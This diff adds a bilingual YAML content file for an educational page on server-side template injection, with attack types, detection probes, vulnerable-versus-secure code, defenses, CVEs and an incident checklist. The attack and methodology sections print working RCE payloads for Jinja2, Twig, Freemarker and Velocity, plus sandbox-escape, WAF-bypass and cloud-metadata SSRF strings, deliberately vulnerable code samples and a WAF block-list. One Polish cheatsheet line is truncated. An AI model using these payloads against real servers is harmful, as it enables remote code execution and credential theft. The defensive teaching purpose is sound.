@@ -1,0 +1,575 @@
+meta:
+  id: ssti
+  threatId: "1.6"
+  severity: Critical
+  color: "#ef4444"
+  colorRgb: 239,68,68
+  cwe: CWE-94
+  cvss: "10.0"
+  standard: OWASP A03:2021
+hero:
+  titleMain: "Template "
+  titleGrad: Injection
+  titleTail: " (SSTI)"
+  topbar: Server-Side Template Injection
+  lead:
+    en: Server-Side Template Injection happens when user input is concatenated into a template that the server then evaluates — turning the template engine into a code interpreter for the attacker. A probe like {{7*7}} returning 49 confirms it; from there a Jinja2 MRO chain, a Twig filter callback, or a Freemarker ?new() gadget walks to os / subprocess for remote code execution. Sandboxes are escaped through Flask context objects, blind cases are confirmed by timing and out-of-band callbacks, and the payload often arrives through an email or PDF template. Unauthenticated SSTI rates CVSS 10.0 Critical.
+    pl: Server-Side Template Injection występuje, gdy wejście użytkownika jest sklejane z szablonem, który serwer następnie oblicza — zamieniając silnik szablonów w interpreter kodu atakującego. Sonda {{7*7}} zwracająca 49 to potwierdza; stamtąd łańcuch MRO w Jinja2, callback filtra Twig lub gadżet ?new() Freemarker prowadzi do os / subprocess dla zdalnego wykonania kodu. Sandboxy obchodzi się przez obiekty kontekstu Flask, przypadki ślepe potwierdza timing i callbacki out-of-band, a ładunek często przychodzi przez szablon e-mail lub PDF. Nieuwierzytelnione SSTI to CVSS 10.0 Krytyczne.
+  metrics:
+    - k: CWE-94
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "10.0"
+      v: CVSS · Critical
+    - k: A03:2021
+      v: OWASP Top 10
+    - k: "8"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP A03:2021
+      url: https://owasp.org/Top10/A03_2021-Injection/
+    - label: CWE-94 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/94.html
+    - label: PortSwigger Academy
+      url: https://portswigger.net/web-security/server-side-template-injection
+    - label: OWASP Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+    - label: HackTricks SSTI
+      url: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+sectionOrder:
+  - overview
+  - types
+  - cheatsheet
+  - code
+  - langrisks
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - sources
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack types
+    pl: Typy ataków
+  - id: cheatsheet
+    en: Detection cheatsheet
+    pl: Ściąga detekcji
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: langrisks
+    en: Engine risks
+    pl: Ryzyka per silnik
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: SAST / DAST
+    pl: SAST / DAST
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: sources
+    en: Sources
+    pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Eight ways the same root cause manifests — from a Jinja2 MRO chain to a WeasyPrint PDF render that pulls cloud metadata.
+      pl: Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od łańcucha MRO w Jinja2 po render PDF WeasyPrint ciągnący metadane chmury.
+    items:
+      - name: Jinja2 MRO Chain RCE
+        sev: critical
+        description:
+          en: "Walk the Python object graph from any string to subprocess. {{''.__class__.__mro__[1].__subclasses__()}} enumerates every loaded class — find the Popen index, then call .__init__.__globals__['os'].popen('id').read(). Flask shortcut: {{lipsum.__globals__['os'].popen('id').read()}}."
+          pl: "Przejdź graf obiektów Pythona od dowolnego stringa do subprocess. {{''.__class__.__mro__[1].__subclasses__()}} wylicza każdą załadowaną klasę — znajdź indeks Popen, potem .__init__.__globals__['os'].popen('id').read(). Skrót Flask: {{lipsum.__globals__['os'].popen('id').read()}}."
+        payload: "{{''.__class__.__mro__[1].__subclasses__()}}"
+      - name: Twig (PHP) Filter Callback RCE
+        sev: critical
+        description:
+          en: Register PHP exec() as an undefined-filter callback, then invoke it. {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} yields RCE — the exact chain behind CVE-2019-9942 in Craft CMS.
+          pl: Zarejestruj PHP exec() jako callback nieznanego filtra, potem go wywołaj. {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} daje RCE — dokładny łańcuch z CVE-2019-9942 w Craft CMS.
+        payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      - name: Freemarker Java Execute class
+        sev: critical
+        description:
+          en: Freemarker's ?new() builtin instantiates arbitrary Java classes. The Execute utility runs OS commands directly; ObjectConstructor and JythonRuntime are alternative gadgets when Execute is blocked.
+          pl: Builtin ?new() w Freemarker instancjuje dowolne klasy Java. Narzędzie Execute uruchamia polecenia OS wprost; ObjectConstructor i JythonRuntime to alternatywne gadżety, gdy Execute jest zablokowane.
+        payload: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
+      - name: Velocity Java Reflection
+        sev: critical
+        description:
+          en: "Velocity has no direct class import, so reach Runtime via reflection. #set($rt=$class.forName('java.lang.Runtime')) then chains getMethod / invoke to call Runtime.exec() without any explicit import."
+          pl: "Velocity nie ma bezpośredniego importu klas, więc dotrzyj do Runtime przez refleksję. #set($rt=$class.forName('java.lang.Runtime')) potem łańcuch getMethod / invoke wywołuje Runtime.exec() bez jawnego importu."
+        payload: "#set($rt=$class.forName('java.lang.Runtime'))"
+      - name: Blind SSTI via Timing
+        sev: high
+        description:
+          en: No output reflected? A heavy expression like {{range(9999999)|list}} or a conditional sleep loop turns response time into an oracle — character-by-character secret extraction takes ~130 timed requests per value.
+          pl: Brak odbitego wyniku? Ciężkie wyrażenie jak {{range(9999999)|list}} lub warunkowa pętla sleep zamienia czas odpowiedzi w wyrocznię — ekstrakcja sekretu znak po znaku to ~130 zmierzonych żądań na wartość.
+        payload: "{{range(9999999)|list}}"
+      - name: Sandbox Escape (Jinja2)
+        sev: critical
+        description:
+          en: SandboxedEnvironment blocks dunder access — but Flask context objects leak it back. request.__class__._load_form_data.__func__.__globals__ or config.__class__.__init__.__globals__['os'] reach os despite the sandbox.
+          pl: SandboxedEnvironment blokuje dostęp do dunderów — ale obiekty kontekstu Flask zwracają go z powrotem. request.__class__._load_form_data.__func__.__globals__ lub config.__class__.__init__.__globals__['os'] sięgają os mimo sandboxa.
+        payload: "{{config.__class__.__init__.__globals__['os']}}"
+      - name: WAF Bypass
+        sev: high
+        description:
+          en: "Defeat ASCII-regex WAFs: {# comment #} stripping plus Unicode whitespace (U+00A0) breaks signatures; |attr('__class__') avoids dot-notation rules; hex encoding '\\x5f\\x5fclass\\x5f\\x5f' reconstructs forbidden dunders."
+          pl: "Pokonaj WAF-y na regexach ASCII: usuwanie {# comment #} plus białe znaki Unicode (U+00A0) łamią sygnatury; |attr('__class__') omija reguły notacji kropkowej; kodowanie hex '\\x5f\\x5fclass\\x5f\\x5f' rekonstruuje zabronione dundery."
+        payload: "{{ ''|attr('\\x5f\\x5fclass\\x5f\\x5f') }}"
+      - name: Email / PDF Template SSTI
+        sev: critical
+        description:
+          en: "render_template_string() in Flask-Mail evaluates payloads before SMTP send. WeasyPrint chains: inject <img src=\"http://169.254.169.254/...\"> via SSTI and WeasyPrint fetches cloud metadata during PDF render."
+          pl: "render_template_string() w Flask-Mail oblicza ładunki przed wysyłką SMTP. Łańcuchy WeasyPrint: wstrzyknij <img src=\"http://169.254.169.254/...\"> przez SSTI, a WeasyPrint pobierze metadane chmury podczas renderu PDF."
+        payload: <img src="http://169.254.169.254/latest/meta-data/">
+  cheatsheet:
+    title:
+      en: Detection cheatsheet
+      pl: Ściąga detekcji
+    lead:
+      en: Five probe families. Arithmetic fingerprinting, the {{7*\'7\'}} engine differentiator, a polyglot error probe, blind timing and out-of-band callbacks.
+      pl: Pięć rodzin sond. Fingerprinting arytmetyczny, różnicowanie silnika {{7*\
+    groups:
+      - name: Arithmetic fingerprint
+        rows:
+          - - Jinja2/Twig/Pebble
+            - "{{7*7}} → 49"
+          - - Freemarker/Velocity
+            - ${7*7} → 49
+          - - Smarty/ERB
+            - "#{7*7} → 49"
+          - - Thymeleaf
+            - "*{7*7} → 49"
+          - - Signal
+            - literal evaluated
+          - - Goal
+            - confirm + bracket syntax
+      - name: Engine differentiator
+        rows:
+          - - Probe
+            - "{{7*'7'}}"
+          - - Jinja2
+            - 7777777 (string repeat)
+          - - Twig
+            - 49 (numeric coerce)
+          - - Use
+            - distinguishes the two
+          - - Follow-up
+            - pick engine-specific RCE
+          - - Tool
+            - manual / tplmap
+      - name: Polyglot error probe
+        rows:
+          - - Vector
+            - ${{<%[%'"}}%>
+          - - Effect
+            - engine-specific parse error
+          - - Leak
+            - engine name in stack trace
+          - - Use
+            - identify engine when blind
+          - - Confirm
+            - differing 500 text
+          - - Tool
+            - Burp Repeater
+      - name: Blind timing
+        rows:
+          - - Vector
+            - "{{range(9999999)|list}}"
+          - - Signal
+            - measurable response delay
+          - - Use
+            - no output reflected
+          - - Extract
+            - ~130 reqs/char secret
+          - - Confirm
+            - delay correlates
+          - - Tool
+            - Burp Intruder timing
+      - name: OOB callback
+        rows:
+          - - Vector
+            - subclasses()[407]('curl ...')
+          - - Channel
+            - DNS / HTTP callback
+          - - Egress
+            - oast.me / Collaborator
+          - - Use
+            - confirm blind RCE
+          - - Confirm
+            - inbound DNS/HTTP hit
+          - - Tool
+            - interactsh / Collaborator
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The same fix across four engines: never make user input the template source — render a fixed template and pass the input as a context variable."
+      pl: "Ta sama naprawa w czterech silnikach: nigdy nie czyń wejścia użytkownika źródłem szablonu — renderuj stały szablon i przekaż wejście jako zmienną kontekstu."
+    languages:
+      - label: Jinja2
+        lang: python
+        vulnerable: |-
+          # VULNERABLE — user input concatenated into the template source
+          from jinja2 import Environment
+          user_input = request.args.get("name")   # e.g. {{7*7}} or MRO chain
+          Environment().from_string("Hello " + user_input).render()
+        safe: |-
+          # SECURE — fixed template, user input is a render context variable
+          from jinja2 import Environment
+          env = Environment()
+          env.get_template("fixed.html").render(name=request.args.get("name"))
+      - label: Twig
+        lang: php
+        vulnerable: |-
+          // VULNERABLE — user input IS the template, not the data
+          $twig->render($user_input, []);
+          // $user_input = {{_self.env.registerUndefinedFilterCallback('exec')}}...
+        safe: |-
+          // SECURE — fixed template file, untrusted data passed as context
+          $twig->render('fixed.html', ['name' => $user_input]);
+          // the template is trusted; $user_input is only ever rendered as text
+      - label: Freemarker
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — template built from a user-controlled string
+          Template t = new Template("", new StringReader(userInput), cfg);
+          // userInput = <#assign ex='...Execute'?new()>${ex('id')}
+        safe: |-
+          // SECURE — pre-compiled template + restricted class resolver
+          cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
+          Template t = cfg.getTemplate("fixed.ftl");   // ?new() gadgets blocked
+      - label: Velocity
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — evaluate() compiles an attacker-supplied string
+          engine.evaluate(ctx, writer, "id", userInput);
+          // userInput = #set($rt=$class.forName('java.lang.Runtime'))...
+        safe: |-
+          // SECURE — pre-compiled .vm file + restricted Uberspect
+          Template t = engine.getTemplate("fixed.vm");
+          t.merge(ctx, writer);   // no runtime compilation of user input
+  langRisks:
+    title:
+      en: Engine-specific risks
+      pl: Ryzyka per silnik
+    lead:
+      en: Each engine has a string-rendering API that compiles user input and a safe fixed-template counterpart — concatenation is the root cause in every one.
+      pl: Każdy silnik ma API renderujące string, które kompiluje wejście użytkownika, i bezpieczny odpowiednik ze stałym szablonem — konkatenacja jest przyczyną w każdym z nich.
+    rows:
+      - fw: Jinja2 (Python)
+        api: Environment().from_string('Hello '+user_input)
+        note:
+          en: "Concatenating input into the source is the #1 SSTI pattern. Use get_template('fixed.html').render(name=user_input) — the template is fixed, input is context."
+          pl: Konkatenacja wejścia w źródło to wzorzec SSTI nr 1. Użyj get_template('fixed.html').render(name=user_input) — szablon jest stały, wejście to kontekst.
+      - fw: Twig (PHP)
+        api: $twig->render($user_input, [])
+        note:
+          en: "Rendering a user-controlled string as a template = RCE. Pass a fixed file and the input as data: $twig->render('fixed.html', ['name'=>$user_input])."
+          pl: "Renderowanie stringa od użytkownika jako szablonu = RCE. Przekaż stały plik, a wejście jako dane: $twig->render('fixed.html', ['name'=>$user_input])."
+      - fw: Freemarker (Java)
+        api: new Template("", new StringReader(userInput), cfg)
+        note:
+          en: Building a Template from user input enables ?new() gadgets. Use pre-compiled templates + cfg.setNewBuiltinClassResolver(SAFER_RESOLVER).
+          pl: Tworzenie Template z wejścia użytkownika umożliwia gadżety ?new(). Użyj prekompilowanych szablonów + cfg.setNewBuiltinClassResolver(SAFER_RESOLVER).
+      - fw: Thymeleaf (Java)
+        api: templateEngine.process(userInput, ctx)
+        note:
+          en: "Also: view-name injection via return userInput in a controller. Use th:text=\"${name}\" and never inline [[${userInput}]] with untrusted data."
+          pl: "Także: wstrzyknięcie nazwy widoku przez return userInput w kontrolerze. Użyj th:text=\"${name}\" i nigdy nie inlinuj [[${userInput}]] z niezaufanymi danymi."
+      - fw: Velocity (Java)
+        api: engine.evaluate(ctx, writer, "id", userInput)
+        note:
+          en: evaluate() compiles the string at runtime. Use a pre-compiled .vm file and a restricted Uberspect to block reflection gadgets.
+          pl: evaluate() kompiluje string w czasie wykonania. Użyj prekompilowanego pliku .vm i ograniczonego Uberspect, by zablokować gadżety refleksji.
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a {{7*7}} probe to full host compromise.
+      pl: Jak atakujący przechodzi od sondy {{7*7}} do pełnej kompromitacji hosta.
+    steps:
+      - title:
+          en: Detect
+          pl: Wykrycie
+        description:
+          en: "Inject {{7*7}}, ${7*7}, #{7*7} and *{7*7} into every parameter that reaches a template; a returned 49 (not the literal) signals injectability."
+          pl: "Wstrzyknij {{7*7}}, ${7*7}, #{7*7} i *{7*7} w każdy parametr trafiający do szablonu; zwrócone 49 (a nie dosłowny ciąg) sygnalizuje podatność."
+      - title:
+          en: Identify engine
+          pl: Identyfikacja silnika
+        description:
+          en: Use {{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig), or the polyglot ${{<%[%'"}}%> to force an engine-specific parse error that names the engine.
+          pl: Użyj {{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig) lub poliglota ${{<%[%'"}}%>, by wymusić błąd parsowania zdradzający silnik.
+      - title:
+          en: Confirm blind
+          pl: Potwierdzenie ślepe
+        description:
+          en: No output? A heavy {{range(9999999)|list}} delays the response, or an OOB curl/DNS callback proves the expression executed.
+          pl: Brak wyniku? Ciężkie {{range(9999999)|list}} opóźnia odpowiedź lub callback OOB curl/DNS dowodzi wykonania wyrażenia.
+      - title:
+          en: Escape sandbox
+          pl: Ucieczka z sandboxa
+        description:
+          en: Walk the object graph (__class__ / __mro__ / __subclasses__) or Flask context objects (config, request, lipsum) to reach os / subprocess.
+          pl: Przejdź graf obiektów (__class__ / __mro__ / __subclasses__) lub obiekty kontekstu Flask (config, request, lipsum), by dotrzeć do os / subprocess.
+      - title:
+          en: Escalate
+          pl: Eskalacja
+        description:
+          en: "Run OS commands, then pivot: read cloud metadata for IAM credentials or chain WeasyPrint/Flask-Mail rendering for SSRF and lateral movement."
+          pl: "Uruchom polecenia OS, potem przeskocz: odczytaj metadane chmury po poświadczenia IAM lub złącz render WeasyPrint/Flask-Mail dla SSRF i ruchu lateralnego."
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — but not all layers are equal. Never concatenating input into templates is the fix; everything else reduces blast radius.
+      pl: Obrona w głąb — ale warstwy nie są równe. Niewklejanie wejścia w szablony to naprawa; reszta ogranicza skutki.
+    items:
+      - rank: 1
+        eff: 100
+        kind: primary
+        label:
+          en: Never concatenate input into templates
+          pl: Nigdy nie wklejaj wejścia w szablony
+        note:
+          en: Always pass user input as render-context variables to a fixed template. The definitive fix — user input must never be template source.
+          pl: Zawsze przekazuj wejście użytkownika jako zmienne kontekstu do stałego szablonu. Ostateczna naprawa — wejście nigdy nie może być źródłem szablonu.
+      - rank: 2
+        eff: 85
+        kind: strong
+        label:
+          en: Sandbox + safe APIs
+          pl: Sandbox + bezpieczne API
+        note:
+          en: SandboxedEnvironment (Jinja2), SAFER_RESOLVER (Freemarker), th:text only (Thymeleaf), restricted Uberspect (Velocity) — defence when dynamic templates are unavoidable.
+          pl: SandboxedEnvironment (Jinja2), SAFER_RESOLVER (Freemarker), tylko th:text (Thymeleaf), ograniczony Uberspect (Velocity) — obrona, gdy dynamiczne szablony są nieuniknione.
+      - rank: 3
+        eff: 75
+        kind: strong
+        label:
+          en: Logic-less engines
+          pl: Silniki bez logiki
+        note:
+          en: Use Mustache / Handlebars where dynamic logic is not needed — no expression evaluation means no SSTI-to-RCE surface.
+          pl: Używaj Mustache / Handlebars tam, gdzie dynamiczna logika nie jest potrzebna — brak ewaluacji wyrażeń to brak powierzchni SSTI-do-RCE.
+      - rank: 4
+        eff: 60
+        kind: mitigation
+        label:
+          en: Allowlist template features
+          pl: Allowlista funkcji szablonów
+        note:
+          en: Disable ?new(), doc(), __class__ and __globals__ access at the engine level so gadget chains have nothing to reach.
+          pl: Wyłącz dostęp do ?new(), doc(), __class__ i __globals__ na poziomie silnika, by łańcuchy gadżetów nie miały do czego sięgać.
+      - rank: 5
+        eff: 50
+        kind: mitigation
+        label:
+          en: Isolated rendering containers
+          pl: Izolowane kontenery renderu
+        note:
+          en: Render templates in containers with dropped capabilities (seccomp/AppArmor) and no egress — shrinks blast radius if a gadget slips through.
+          pl: Renderuj szablony w kontenerach z odebranymi capabilities (seccomp/AppArmor) i bez ruchu wychodzącego — ogranicza skutki, gdy gadżet się prześlizgnie.
+      - rank: 6
+        eff: 20
+        kind: weak
+        label:
+          en: WAF (compensating only)
+          pl: WAF (tylko kompensacyjny)
+        note:
+          en: "Rules blocking {{, }}, ${, #set, ?new(), __class__, __mro__, subclasses help — but Unicode, |attr() and hex encoding bypass signatures. Detective, never preventive."
+          pl: "Reguły blokujące {{, }}, ${, #set, ?new(), __class__, __mro__, subclasses pomagają — ale Unicode, |attr() i kodowanie hex omijają sygnatury. Detekcyjny, nigdy zapobiegawczy."
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: SSTI is not theoretical — these CVEs reached CVSS 10.0, powered Mirai-driven mass exploitation, and earned $20,000+ bug bounties.
+      pl: SSTI nie jest teoretyczne — te CVE osiągnęły CVSS 10.0, napędziły masową eksploatację przez Mirai i przyniosły nagrody $20,000+.
+    items:
+      - org: Spring Cloud Gateway
+        year: 2022
+        impact: CVE-2022-22947
+        cost: CVSS 10.0
+        description:
+          en: SpEL SSTI via Actuator routes, unauthenticated — mass-exploited within days of disclosure across thousands of Spring Gateway deployments.
+          pl: SpEL SSTI przez trasy Actuator, bez uwierzytelnienia — masowo eksploitowane w ciągu dni od ujawnienia na tysiącach wdrożeń Spring Gateway.
+      - org: Spring Cloud Function
+        year: 2022
+        impact: CVE-2022-22963
+        cost: CVSS 9.8
+        description:
+          en: SpEL injection via the spring.cloud.function.routing-expression HTTP header — exploited by Mirai botnet variants.
+          pl: Wstrzyknięcie SpEL przez nagłówek HTTP spring.cloud.function.routing-expression — eksploitowane przez warianty botnetu Mirai.
+      - org: Confluence Server
+        year: 2019
+        impact: CVE-2019-3396
+        cost: CVSS 9.8
+        description:
+          en: Velocity/OGNL SSTI via the Widget Connector url parameter — unauthenticated RCE used in ransomware campaigns.
+          pl: Velocity/OGNL SSTI przez parametr url Widget Connector — RCE bez uwierzytelnienia użyte w kampaniach ransomware.
+      - org: Uber Bug Bounty
+        year: 2016
+        impact: $10,000
+        cost: Jinja2 SSTI
+        description:
+          en: Jinja2 SSTI via render_template_string() in an internal tool — full RCE demonstrated with an MRO chain payload.
+          pl: Jinja2 SSTI przez render_template_string() w wewnętrznym narzędziu — pełne RCE pokazane ładunkiem łańcucha MRO.
+      - org: Shopify
+        year: 2019
+        impact: $20,000+
+        cost: Liquid SSTI
+        description:
+          en: Liquid template injection via Liquid::Template.parse(user_input) — remote code execution on Shopify partner tooling.
+          pl: Wstrzyknięcie szablonu Liquid przez Liquid::Template.parse(user_input) — zdalne wykonanie kodu na narzędziach partnerskich Shopify.
+      - org: Jira Service Mgmt
+        year: 2023
+        impact: CVE-2023-22501
+        cost: CVSS 9.4
+        description:
+          en: Velocity SSTI in Jira Service Management allowed unauthenticated account takeover via email-verification templates.
+          pl: Velocity SSTI w Jira Service Management umożliwił przejęcie konta bez uwierzytelnienia przez szablony weryfikacji e-mail.
+    inlineSources:
+      - label: Spring Gateway CVE-2022-22947
+        url: https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+      - label: Spring Function CVE-2022-22963
+        url: https://nvd.nist.gov/vuln/detail/CVE-2022-22963
+      - label: Confluence CVE-2019-3396
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3396
+      - label: Jira CVE-2023-22501
+        url: https://nvd.nist.gov/vuln/detail/CVE-2023-22501
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis flags user input flowing into template compilation; dynamic scanners and out-of-band servers confirm blind exploitability. Use both.
+      pl: Analiza statyczna oznacza wejście użytkownika trafiające do kompilacji szablonu; skanery dynamiczne i serwery out-of-band potwierdzają ślepą eksploatowalność. Używaj obu.
+    sast:
+      - - Semgrep
+        - python.flask.security.audit.render-template-string
+      - - Bandit
+        - B702 — use of mako/template with tainted input
+      - - CodeQL
+        - java/template-injection dataflow query
+      - - Manual
+        - grep from_string / render($input) / evaluate(...)
+    dast:
+      - - tplmap
+        - Automated SSTI detection & exploitation
+      - - SSTImap
+        - Modern tplmap successor, multi-engine
+      - - Burp Suite
+        - Active Scan + Collaborator for blind OOB
+      - - interactsh
+        - Out-of-band DNS/HTTP callback server
+    note:
+      en: <strong>Key signal:</strong> grep for <code>render_template_string(tainted)</code>, <code>Environment().from_string(...)</code>, <code>$twig->render($input)</code>, <code>new Template("", new StringReader(input), ...)</code> and <code>engine.evaluate(..., input)</code> — user input as template source is the root cause.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj <code>render_template_string(tainted)</code>, <code>Environment().from_string(...)</code>, <code>$twig->render($input)</code>, <code>new Template("", new StringReader(input), ...)</code> i <code>engine.evaluate(..., input)</code> — wejście użytkownika jako źródło szablonu to przyczyna źródłowa.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where SSTI prevention maps onto the hard compliance gates auditors check — because SSTI-to-RCE is a full system and PII compromise.
+      pl: Gdzie zapobieganie SSTI mapuje się na twarde bramki zgodności sprawdzane przez audytorów — bo SSTI-do-RCE to pełna kompromitacja systemu i PII.
+    items:
+      - std: PCI DSS v4.0
+        items:
+          - 6.3.2 — inventory & review custom code
+          - 6.3.3 — patch known vulnerabilities
+          - SSTI→RCE = full CDE compromise, hard QSA gate
+      - std: SOC 2
+        items:
+          - CC6.1 — logical access controls
+          - CC7.1 — vulnerability detection
+          - Code review + SAST gates for template endpoints
+      - std: GDPR / OWASP
+        items:
+          - Art 32/33 — RCE exposes all PII, 72h breach notice
+          - A03:2021 — Injection
+          - CWE-94 — Code Injection
+    inlineSources:
+      - label: PCI DSS v4.0
+        url: https://www.pcisecuritystandards.org/document_library/
+      - label: SOC 2 (AICPA)
+        url: https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security
+      - label: CWE-94 (MITRE)
+        url: https://cwe.mitre.org/data/definitions/94.html
+      - label: OWASP A03:2021
+        url: https://owasp.org/Top10/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active SSTI breach, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnego wycieku SSTI przejdź tę listę od góry.
+    steps:
+      - en: Segment the network — isolate the host and block outbound egress immediately
+        pl: Segmentuj sieć — natychmiast odizoluj host i zablokuj ruch wychodzący
+      - en: Snapshot memory and disk; preserve access logs before they rotate
+        pl: Zrób zrzut pamięci i dysku; zabezpiecz logi dostępu zanim się przerotują
+      - en: Identify the template engine and the exact endpoint that compiled user input
+        pl: Zidentyfikuj silnik szablonów i dokładny endpoint kompilujący wejście użytkownika
+      - en: Correlate web access logs with the request carrying the {{ }} / ${ } payload
+        pl: Skoreluj logi dostępu WWW z żądaniem niosącym ładunek {{ }} / ${ }
+      - en: Rotate every credential the host could reach — IAM roles, API keys, SSH keys
+        pl: Zrotuj każde poświadczenie w zasięgu hosta — role IAM, klucze API, klucze SSH
+      - en: "Patch: pass input as render context to a fixed template, redeploy with a sandbox"
+        pl: "Załataj: przekaż wejście jako kontekst do stałego szablonu, wdróż z sandboxem"
+      - en: Hunt for persistence — cron, systemd units, authorized_keys, webshells
+        pl: Poluj na persystencję — cron, jednostki systemd, authorized_keys, webshelle
+      - en: Notify per PCI DSS / SOC 2 / GDPR obligations and sweep sibling endpoints with Semgrep/tplmap
+        pl: Powiadom zgodnie z PCI DSS / SOC 2 / GDPR i przeskanuj bliźniacze endpointy Semgrep/tplmap
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+      - label: OWASP A03:2021 Injection
+        url: https://owasp.org/Top10/A03_2021-Injection/
+      - label: CWE-94 (MITRE)
+        url: https://cwe.mitre.org/data/definitions/94.html
+      - label: PortSwigger — Server-Side Template Injection
+        url: https://portswigger.net/web-security/server-side-template-injection
+      - label: OWASP Injection Prevention Cheat Sheet
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+      - label: HackTricks — SSTI
+        url: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+      - label: Spring Cloud Gateway CVE-2022-22947
+        url: https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+      - label: Spring Cloud Function CVE-2022-22963
+        url: https://nvd.nist.gov/vuln/detail/CVE-2022-22963
+      - label: Confluence CVE-2019-3396
+        url: https://nvd.nist.gov/vuln/detail/CVE-2019-3396
+      - label: Jira CVE-2023-22501
+        url: https://nvd.nist.gov/vuln/detail/CVE-2023-22501
